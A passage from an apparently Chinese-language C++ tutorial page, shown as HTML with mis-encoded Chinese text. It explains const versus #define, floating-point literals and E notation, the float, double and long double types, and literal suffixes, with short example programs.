å˜é‡èµ‹å€¼</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Months in a year: &quot;</span> &lt;&lt; MONTHS_IN_YEAR &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">double</span> radius = <span class="number">5.0</span>;</span><br><span class="line">    <span class="keyword">double</span> circumference = <span class="number">2</span> * PI * radius; <span class="comment">// ä½¿ç”¨ const å¸¸é‡ PI</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Circumference: &quot;</span> &lt;&lt; circumference &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// const å¸¸é‡ä¹Ÿéµå¾ªä½œç”¨åŸŸè§„åˆ™</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> MAX_TRIES = <span class="number">3</span>; <span class="comment">// åªåœ¨ if å—å†…æœ‰æ•ˆ</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Max tries inside block: &quot;</span> &lt;&lt; MAX_TRIES &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; MAX_TRIES; // é”™è¯¯! MAX_TRIES åœ¨æ­¤ä½œç”¨åŸŸå¤–ä¸å¯è§</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¿…é¡»åœ¨å£°æ˜æ—¶åˆå§‹åŒ–</span></span><br><span class="line">    <span class="comment">// const int DAYS_IN_WEEK; // é”™è¯¯! const å˜é‡éœ€è¦åˆå§‹åŒ–</span></span><br><span class="line">    <span class="comment">// DAYS_IN_WEEK = 7; </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>const</code> ä¸ <code>#define</code> çš„æ¯”è¾ƒ:</strong></p><p>åœ¨ C è¯­è¨€ä¸­ï¼Œé€šå¸¸ä½¿ç”¨ <code>#define</code> é¢„å¤„ç†å™¨æŒ‡ä»¤æ¥åˆ›å»ºç¬¦å·å¸¸é‡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MONTHS_IN_YEAR 12 <span class="comment">// C é£æ ¼å®å®šä¹‰</span></span></span><br></pre></td></tr></table></figure><p>è™½ç„¶ <code>#define</code> ä¹Ÿèƒ½è¾¾åˆ°ç±»ä¼¼ç›®çš„ï¼Œä½† <code>const</code> åœ¨ C++ ä¸­é€šå¸¸æ˜¯æ›´å¥½çš„é€‰æ‹©ï¼š</p><ol><li> <strong>ç±»å‹å®‰å…¨:</strong> <code>const</code> å¸¸é‡æœ‰æ˜ç¡®çš„æ•°æ®ç±»å‹ï¼Œç¼–è¯‘å™¨ä¼šè¿›è¡Œç±»å‹æ£€æŸ¥ã€‚<code>#define</code> åªæ˜¯ç®€å•çš„æ–‡æœ¬æ›¿æ¢ï¼Œæ²¡æœ‰ç±»å‹ä¿¡æ¯ï¼Œå¯èƒ½å¯¼è‡´æ„å¤–é”™è¯¯ã€‚</li><li> <strong>ä½œç”¨åŸŸ:</strong> <code>const</code> å¸¸é‡éµå¾ª C++ çš„ä½œç”¨åŸŸè§„åˆ™ï¼Œå¯ä»¥åˆ›å»ºå±€éƒ¨å¸¸é‡ã€‚<code>#define</code> å®é€šå¸¸æ˜¯å…¨å±€çš„ï¼ˆä»å®šä¹‰ç‚¹åˆ°æ–‡ä»¶å°¾ï¼‰ï¼Œå®¹æ˜“é€ æˆå‘½åå†²çªã€‚</li><li> <strong>è°ƒè¯•:</strong> <code>const</code> å¸¸é‡åœ¨è°ƒè¯•å™¨ä¸­é€šå¸¸å¯è§ï¼Œæœ‰ç¬¦å·åã€‚<code>#define</code> å®åœ¨ç¼–è¯‘å‰å°±è¢«æ›¿æ¢æ‰äº†ï¼Œè°ƒè¯•æ—¶å¯èƒ½åªèƒ½çœ‹åˆ°æ›¿æ¢åçš„å­—é¢å€¼ã€‚</li><li> <strong>ç±»ä½œç”¨åŸŸ:</strong> <code>const</code> å¯ä»¥ç”¨äºå®šä¹‰ç±»ä½œç”¨åŸŸå†…çš„å¸¸é‡ï¼ˆç±»æˆå‘˜ï¼‰ï¼Œè€Œ <code>#define</code> ä¸èƒ½ç›´æ¥åšåˆ°è¿™ä¸€ç‚¹ã€‚</li></ol><p><strong>ä¸€èˆ¬å»ºè®®:</strong> åœ¨ C++ ä¸­ï¼Œä¼˜å…ˆä½¿ç”¨ <code>const</code> æ¥å®šä¹‰ç¬¦å·å¸¸é‡ï¼Œè€Œä¸æ˜¯ <code>#define</code>ã€‚</p><h2 id="3-3-æµ®ç‚¹æ•°"><a href="#3-3-æµ®ç‚¹æ•°" class="headerlink" title="3.3 æµ®ç‚¹æ•°"></a>3.3 æµ®ç‚¹æ•°</h2><p>æµ®ç‚¹æ•°æ˜¯C++ä¸­ç”¨äºè¡¨ç¤ºå¸¦å°æ•°éƒ¨åˆ†çš„æ•°å­—ï¼ˆå®æ•°ï¼‰çš„ç±»å‹ã€‚å®ƒä»¬å¯ä»¥è¡¨ç¤ºéå¸¸å¤§æˆ–éå¸¸å°çš„æ•°å€¼ï¼Œä»¥åŠæ•´æ•°æ— æ³•è¡¨ç¤ºçš„å°æ•°ã€‚</p><h3 id="3-3-1-ä¹¦å†™æµ®ç‚¹æ•°"><a href="#3-3-1-ä¹¦å†™æµ®ç‚¹æ•°" class="headerlink" title="3.3.1 ä¹¦å†™æµ®ç‚¹æ•°"></a>3.3.1 ä¹¦å†™æµ®ç‚¹æ•°</h3><p>C++å…è®¸ä½¿ç”¨ä¸¤ç§æ–¹å¼æ¥ä¹¦å†™æµ®ç‚¹å­—é¢å€¼ï¼ˆå¸¸é‡ï¼‰ï¼š</p><ol><li><p><strong>æ ‡å‡†å°æ•°ç‚¹è¡¨ç¤ºæ³• (Standard Decimal Point Notation):</strong></p><ul><li>  åŒ…å«ä¸€ä¸ªå°æ•°ç‚¹ã€‚</li><li>  ä¾‹å¦‚ï¼š<code>12.34</code>, <code>0.0</code>, <code>99.</code>, <code>.5</code> (ç­‰åŒäº 0.5), <code>-1.67</code>ã€‚</li></ul></li><li><p><strong>Eè¡¨ç¤ºæ³• (E Notation) æˆ–ç§‘å­¦è®°æ•°æ³• (Scientific Notation):</strong></p><ul><li>  ç”¨äºè¡¨ç¤ºéå¸¸å¤§æˆ–éå¸¸å°çš„æ•°ã€‚</li><li>  æ ¼å¼ä¸ºï¼š<code>mantissaEexponent</code> æˆ– <code>mantissaeexponent</code>ã€‚</li><li>  <code>mantissa</code> (å°¾æ•°) æ˜¯ä¸€ä¸ªæ•°å­—ï¼ˆå¯ä»¥å¸¦å°æ•°ç‚¹ï¼‰ã€‚</li><li>  <code>E</code> æˆ– <code>e</code> è¡¨ç¤º â€œä¹˜ä»¥10çš„â€¦æ¬¡å¹‚â€ã€‚</li><li>  <code>exponent</code> (æŒ‡æ•°) æ˜¯ä¸€ä¸ªæ•´æ•°ï¼ˆå¯ä»¥ä¸ºè´Ÿï¼‰ã€‚</li><li>ä¾‹å¦‚ï¼š<ul><li>  <code>3.45E6</code> è¡¨ç¤º 3.45 * 10<sup>6</sup> (å³ 3,450,000)ã€‚</li><li>  <code>2.5e-4</code> è¡¨ç¤º 2.5 * 10<sup>-4</sup> (å³ 0.00025)ã€‚</li><li>  <code>9E12</code> è¡¨ç¤º 9 * 10<sup>12</sup>ã€‚</li><li>  <code>-1.23e+3</code> è¡¨ç¤º -1.23 * 10<sup>3</sup> (å³ -1230)ã€‚</li></ul></li></ul></li></ol><p><strong>æ³¨æ„:</strong></p><ul><li>  Eè¡¨ç¤ºæ³•ä¸­ï¼Œ<code>E</code> æˆ– <code>e</code> å‰åä¸èƒ½æœ‰ç©ºæ ¼ã€‚</li><li>  æŒ‡æ•°å¿…é¡»æ˜¯æ•´æ•°ã€‚</li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// æ ‡å‡†å°æ•°ç‚¹è¡¨ç¤ºæ³•</span></span><br><span class="line">    <span class="keyword">double</span> price = <span class="number">99.99</span>;</span><br><span class="line">    <span class="keyword">double</span> temperature = <span class="number">-15.5</span>;</span><br><span class="line">    <span class="keyword">double</span> small_fraction = <span class="number">.25</span>; <span class="comment">// ç­‰åŒäº 0.25</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// E è¡¨ç¤ºæ³•</span></span><br><span class="line">    <span class="keyword">double</span> earth_mass = <span class="number">5.972E24</span>; <span class="comment">// åœ°çƒè´¨é‡ (kg)</span></span><br><span class="line">    <span class="keyword">double</span> electron_charge = <span class="number">-1.602e-19</span>; <span class="comment">// ç”µå­ç”µè· (åº“ä»‘)</span></span><br><span class="line">    <span class="keyword">double</span> large_number = <span class="number">1.0e9</span>; <span class="comment">// 10 äº¿</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Price: &quot;</span> &lt;&lt; price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Temperature: &quot;</span> &lt;&lt; temperature &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Small fraction: &quot;</span> &lt;&lt; small_fraction &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// é»˜è®¤æƒ…å†µä¸‹ï¼Œcout å¯èƒ½å¯¹éå¸¸å¤§æˆ–å°çš„æ•°è‡ªåŠ¨ä½¿ç”¨ç§‘å­¦è®°æ•°æ³•è¾“å‡º</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Earth mass: &quot;</span> &lt;&lt; earth_mass &lt;&lt; <span class="string">&quot; kg&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Electron charge: &quot;</span> &lt;&lt; electron_charge &lt;&lt; <span class="string">&quot; C&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Large number: &quot;</span> &lt;&lt; large_number &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯ä»¥ä½¿ç”¨ &lt;iomanip&gt; æ§åˆ¶è¾“å‡ºæ ¼å¼ (åç»­ç« èŠ‚ä¼šè¯¦ç»†ä»‹ç»)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.setf(<span class="built_in">std</span>::ios_base::fixed, <span class="built_in">std</span>::ios_base::floatfield); <span class="comment">// è®¾ç½®ä¸ºå®šç‚¹è¡¨ç¤ºæ³•</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Large number (fixed): &quot;</span> &lt;&lt; large_number &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3-2-æµ®ç‚¹ç±»å‹"><a href="#3-3-2-æµ®ç‚¹ç±»å‹" class="headerlink" title="3.3.2 æµ®ç‚¹ç±»å‹"></a>3.3.2 æµ®ç‚¹ç±»å‹</h3><p>C++æä¾›äº†ä¸‰ç§æµ®ç‚¹ç±»å‹ï¼Œå®ƒä»¬åœ¨ç²¾åº¦ï¼ˆæœ‰æ•ˆä½æ•°ï¼‰å’Œå­˜å‚¨èŒƒå›´ä¸Šæœ‰æ‰€ä¸åŒï¼š</p><ol><li> <strong><code>float</code>:</strong> å•ç²¾åº¦æµ®ç‚¹æ•°ã€‚é€šå¸¸å ç”¨ 4 ä¸ªå­—èŠ‚ (32ä½)ã€‚ç²¾åº¦è¾ƒä½ï¼ŒèŒƒå›´è¾ƒå°ã€‚</li><li> <strong><code>double</code>:</strong> åŒç²¾åº¦æµ®ç‚¹æ•°ã€‚é€šå¸¸å ç”¨ 8 ä¸ªå­—èŠ‚ (64ä½)ã€‚ç²¾åº¦å’ŒèŒƒå›´æ¯” <code>float</code> å¤§å¾ˆå¤šã€‚è¿™æ˜¯C++ä¸­æœ€å¸¸ç”¨çš„æµ®ç‚¹ç±»å‹ï¼Œæµ®ç‚¹å¸¸é‡ï¼ˆå¦‚ <code>3.14</code>ï¼‰é»˜è®¤å°±æ˜¯ <code>double</code> ç±»å‹ã€‚</li><li> <strong><code>long double</code>:</strong> æ‰©å±•ç²¾åº¦æµ®ç‚¹æ•°ã€‚é€šå¸¸å ç”¨ 8ã€10ã€12 æˆ– 16 ä¸ªå­—èŠ‚ï¼Œå…·ä½“å–å†³äºç¼–è¯‘å™¨å’Œç³»ç»Ÿã€‚æä¾›æœ€é«˜çš„ç²¾åº¦å’Œæœ€å¤§çš„èŒƒå›´ã€‚</li></ol><p><strong>ç²¾åº¦å’ŒèŒƒå›´:</strong></p><ul><li><strong>ç²¾åº¦ (Precision):</strong> æŒ‡çš„æ˜¯å¯ä»¥è¡¨ç¤ºçš„æœ‰æ•ˆæ•°å­—çš„ä½æ•°ã€‚<ul><li>  <code>float</code> é€šå¸¸ä¿è¯è‡³å°‘ 6 ä½æœ‰æ•ˆæ•°å­—ã€‚</li><li>  <code>double</code> é€šå¸¸ä¿è¯è‡³å°‘ 15 ä½æœ‰æ•ˆæ•°å­—ã€‚</li><li>  <code>long double</code> é€šå¸¸æä¾›æ¯” <code>double</code> æ›´é«˜çš„ç²¾åº¦ã€‚</li></ul></li><li>  <strong>èŒƒå›´ (Range):</strong> æŒ‡çš„æ˜¯å¯ä»¥è¡¨ç¤ºçš„æœ€å°å’Œæœ€å¤§æ•°å€¼ã€‚<code>double</code> çš„èŒƒå›´è¿œå¤§äº <code>float</code>ï¼Œ<code>long double</code> çš„èŒƒå›´é€šå¸¸æ›´å¤§ã€‚</li></ul><p>å¯ä»¥ä½¿ç”¨ <code>&lt;cfloat&gt;</code> (æˆ– C è¯­è¨€çš„ <code>&lt;float.h&gt;</code>) å¤´æ–‡ä»¶ä¸­çš„å¸¸é‡æ¥æŸ¥çœ‹å…·ä½“ç³»ç»Ÿçš„ç²¾åº¦å’ŒèŒƒå›´é™åˆ¶ï¼ˆä¾‹å¦‚ <code>FLT_DIG</code>, <code>DBL_DIG</code>, <code>LDBL_DIG</code> è¡¨ç¤ºæœ‰æ•ˆä½æ•°ï¼‰ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cfloat&gt; // åŒ…å«æµ®ç‚¹æ•°é™åˆ¶ä¿¡æ¯</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// æŸ¥çœ‹å„ç§ç±»å‹å ç”¨çš„å­—èŠ‚æ•°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of float: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">float</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of double: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">double</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of long double: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">double</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŸ¥çœ‹ç²¾åº¦ (æœ‰æ•ˆä½æ•°)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Digits of precision for float: &quot;</span> &lt;&lt; FLT_DIG &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Digits of precision for double: &quot;</span> &lt;&lt; DBL_DIG &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Digits of precision for long double: &quot;</span> &lt;&lt; LDBL_DIG &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å£°æ˜å’Œåˆå§‹åŒ–</span></span><br><span class="line">    <span class="keyword">float</span> f_pi = <span class="number">3.14159265f</span>; <span class="comment">// f åç¼€è¡¨ç¤º float</span></span><br><span class="line">    <span class="keyword">double</span> d_pi = <span class="number">3.141592653589793</span>; <span class="comment">// é»˜è®¤æ˜¯ double</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">double</span> ld_pi = <span class="number">3.14159265358979323846L</span>; <span class="comment">// L åç¼€è¡¨ç¤º long double</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">20</span>); <span class="comment">// è®¾ç½® cout è¾“å‡ºç²¾åº¦ä»¥ä¾¿è§‚å¯Ÿå·®å¼‚</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;float pi:       &quot;</span> &lt;&lt; f_pi &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;double pi:      &quot;</span> &lt;&lt; d_pi &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;long double pi: &quot;</span> &lt;&lt; ld_pi &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>é€‰æ‹©å»ºè®®:</strong></p><ul><li>  é™¤éæœ‰ç‰¹åˆ«çš„å†…å­˜æˆ–æ€§èƒ½è€ƒè™‘ï¼Œå¹¶ä¸”ç¡®å®š <code>float</code> çš„ç²¾åº¦è¶³å¤Ÿï¼Œå¦åˆ™**ä¼˜å…ˆä½¿ç”¨ <code>double</code>**ã€‚å®ƒæ˜¯C++æµ®ç‚¹è®¡ç®—çš„å¸¸ç”¨ç±»å‹ã€‚</li><li>  å½“éœ€è¦æé«˜çš„ç²¾åº¦æˆ–éå¸¸å¤§çš„æ•°å€¼èŒƒå›´æ—¶ï¼Œä½¿ç”¨ <code>long double</code>ã€‚</li></ul><h3 id="3-3-3-æµ®ç‚¹å¸¸é‡"><a href="#3-3-3-æµ®ç‚¹å¸¸é‡" class="headerlink" title="3.3.3 æµ®ç‚¹å¸¸é‡"></a>3.3.3 æµ®ç‚¹å¸¸é‡</h3><p>æµ®ç‚¹å¸¸é‡ï¼ˆå­—é¢å€¼ï¼‰å°±æ˜¯ç›´æ¥å†™åœ¨ä»£ç ä¸­çš„æµ®ç‚¹æ•°å€¼ï¼Œä¾‹å¦‚ <code>3.14</code>, <code>1.0</code>, <code>-2.5e8</code>ã€‚</p><p><strong>é»˜è®¤ç±»å‹:</strong><br>é»˜è®¤æƒ…å†µä¸‹ï¼ŒC++å°†ä¸å¸¦åç¼€çš„æµ®ç‚¹å¸¸é‡è§†ä¸º <code>double</code> ç±»å‹ã€‚</p><p><strong>åç¼€ (Suffixes):</strong><br>å¯ä»¥é€šè¿‡æ·»åŠ åç¼€æ¥æ˜¾å¼æŒ‡å®šæµ®ç‚¹å¸¸é‡çš„ç±»å‹ï¼š</p><ul><li>  <code>f</code> æˆ– <code>F</code>: è¡¨ç¤º <code>float</code> ç±»å‹ã€‚</li><li>  <code>l</code> æˆ– <code>L</code>: è¡¨ç¤º <code>long double</code> ç±»å‹ã€‚</li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;typeinfo&gt; // ç”¨äº typeid (ä»…ä½œæ¼”ç¤º)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// é»˜è®¤ç±»å‹æ˜¯ double</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 3.14: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(<span class="number">3.14</span>).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 1.0e-5: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(<span class="number">1.0e-5</span>).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨åç¼€æŒ‡å®šç±»å‹</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 3.14f: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(<span class="number">3.14f</span>).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// float</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 3.14F: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(<span class="number">3.14F</span>).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// float</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 3.14l: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(<span class="number">3.14l</span>).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// long double</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 3.14L: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(<span class="number">3.14L</span>).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// long double</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// èµ‹å€¼æ—¶çš„ç±»å‹åŒ¹é…</span></span><br><span class="line">    <span class="keyword">float</span> price = <span class="number">99.99f</span>; <span class="comment">// ä½¿ç”¨ f åç¼€é¿å…ä» double åˆ° float çš„å¯èƒ½ç²¾åº¦æŸå¤±è­¦å‘Š</span></span><br><span class="line">    <span class="keyword">double</span> weight = <span class="number">75.5</span>; <span class="comment">// 75.5 æ˜¯ double, èµ‹å€¼ç»™ double å˜é‡</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">double</span> distance = <span class="number">1.23e10</span>L; <span class="comment">// ä½¿ç”¨ L åç¼€</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Price: &quot;</span> &lt;&lt; price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Weight: &quot;</span> &lt;&lt; weight &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Distance: &quot;</span> &lt;&lt; distance &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>(æ³¨æ„: <code>typeid().name()</code> çš„è¾“å‡ºå¯èƒ½å› ç¼–è¯‘å™¨è€Œå¼‚ï¼Œä½†å¯ä»¥å¤§è‡´çœ‹å‡ºç±»å‹)</em></p><p>åœ¨å°†å¸¸é‡èµ‹ç»™ <code>float</code> å˜é‡æ—¶ï¼Œä½¿ç”¨ <code>f</code> æˆ– <code>F</code> åç¼€æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ï¼Œå¯ä»¥é¿å…ç¼–è¯‘å™¨äº§ç”Ÿå…³äºä» <code>double</code> è½¬æ¢åˆ° <code>float</code> å¯èƒ½ä¸¢å¤±ç²¾åº¦çš„è­¦å‘Šã€‚</p><h3 id="3-3-4-æµ®ç‚¹æ•°çš„ä¼˜ç¼ºç‚¹"><a href="#3-3-4-æµ®ç‚¹æ•°çš„ä¼˜ç¼ºç‚¹" class="headerlink" title="3.3.4 æµ®ç‚¹æ•°çš„ä¼˜ç¼ºç‚¹"></a>3.3.4 æµ®ç‚¹æ•°çš„ä¼˜ç¼ºç‚¹</h3><p>æµ®ç‚¹æ•°åœ¨è¡¨ç¤ºå®æ•°æ–¹é¢éå¸¸æœ‰ç”¨ï¼Œä½†ä¹Ÿå­˜åœ¨ä¸€äº›å›ºæœ‰çš„é™åˆ¶å’Œéœ€è¦æ³¨æ„çš„åœ°æ–¹ã€‚</p><p><strong>ä¼˜ç‚¹:</strong></p><ol><li> <strong>è¡¨ç¤ºèŒƒå›´å¹¿:</strong> å¯ä»¥è¡¨ç¤ºæ¯”æ•´å‹å¤§å¾—å¤šæˆ–å°å¾—å¤šçš„æ•°å€¼ã€‚</li><li> 